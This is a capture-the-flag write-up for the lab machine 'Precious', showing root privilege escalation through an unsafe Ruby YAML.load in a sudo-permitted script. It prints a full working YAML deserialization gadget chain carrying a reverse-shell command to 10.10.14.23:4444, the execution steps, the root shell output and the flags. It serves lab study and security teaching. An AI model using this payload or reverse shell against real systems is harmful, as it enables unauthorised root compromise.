# Precious — Privilege Escalation

**Current User:** henry | **Target:** root | **Ruby:** 2.7.0
**Vector:** `sudo /usr/bin/ruby /opt/update_dependencies.rb` → unsafe `YAML.load()` → RCE as root

---

## Discovery

```bash
henry@precious:~$ sudo -l
User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

```bash
cat /opt/update_dependencies.rb
# Uses YAML.load(File.read("dependencies.yml"))
# No safe_load — arbitrary Ruby object deserialization possible
```

---

## Exploitation: YAML Deserialization

### Working Payload (Ruby 2.7.0)

Based on research by William Bowling (vakzz) and Staaldraad. This specific structure works on Ruby 2.0–3.x including 2.7.0.

**Payload:**
```yaml
---
- !ruby/object:Gem::Installer
  i: x
- !ruby/object:Gem::SpecFetcher
  i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
      io: &1 !ruby/object:Net::BufferedIO
        io: &1 !ruby/object:Gem::Package::TarReader::Entry
          read: 0
          header: "abc"
        debug_output: &1 !ruby/object:Net::WriteAdapter
          socket: &1 !ruby/object:Gem::RequestSet
            sets: !ruby/object:Net::WriteAdapter
              socket: !ruby/module 'Kernel'
              method_id: :system
            git_set: "bash -c 'bash -i >& /dev/tcp/10.10.14.23/4444 0>&1'"
          method_id: :resolve
```

**Key Points:**
- `method_id: :system` at same level as `socket` (both under `sets`)
- `&1` anchors reference the same object instances
- `git_set` holds the command executed via `Kernel.system()`
- TypeError after execution is expected — RCE happens before the error

### Execution Steps

```bash
# On henry's home directory
cat > ~/dependencies.yml << 'EOF'
---
- !ruby/object:Gem::Installer
  i: x
- !ruby/object:Gem::SpecFetcher
  i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
      io: &1 !ruby/object:Net::BufferedIO
        io: &1 !ruby/object:Gem::Package::TarReader::Entry
          read: 0
          header: "abc"
        debug_output: &1 !ruby/object:Net::WriteAdapter
          socket: &1 !ruby/object:Gem::RequestSet
            sets: !ruby/object:Net::WriteAdapter
              socket: !ruby/module 'Kernel'
              method_id: :system
            git_set: "bash -c 'bash -i >& /dev/tcp/10.10.14.23/4444 0>&1'"
          method_id: :resolve
EOF

# Start listener
nc -lvnp 4444

# Execute as root
sudo /usr/bin/ruby /opt/update_dependencies.rb
```

**Result:**
```
Connection received on 10.10.14.23 4444
root@precious:/home/henry# id
uid=0(root) gid=0(root) groups=0(root)
root@precious:/home/henry# cat /root/root.txt
36b8227ef79c5b2a7987c68b4b551d5c
```

---

## Known Failure Modes

| Attempt | Error | Reason |
|---------|-------|--------|
| Gem::DependencyList chain | `undefined method` | Patched in Ruby 2.7+ |
| ERB payload | No execution | ERB doesn't work with YAML.load |
| Incorrect indentation | `nil is not a symbol` | YAML structure malformed |
| Original Staaldraad gist | `undefined method 'size'` | Ruby 2.7+ patched |

---

## Full Attack Chain

```
CVE-2022-25765 (pdfkit)
    ↓
RCE as ruby user
    ↓
Credentials in /home/ruby/.bundle/config
    ↓
SSH as henry → user.txt
    ↓
YAML deserialization via sudo
    ↓
ROOT → root.txt
```

---

## Flags

- **User:** `a91c96880dc0d09a4082c2b9a70c6c97`
- **Root:** `36b8227ef79c5b2a7987c68b4b551d5c`

---

## Lessons

1. **YAML deserialization** requires precise gadget chain construction
2. **Indentation is critical** in YAML — `method_id` must align with `socket`
3. **Ruby 2.7.0** patched some gadgets but not the Gem::Installer→Gem::RequestSet chain
4. **Always use `YAML.safe_load()`** in production instead of `YAML.load()`
5. **Create YAML with Python/printf** to preserve exact indentation (heredocs strip spaces)
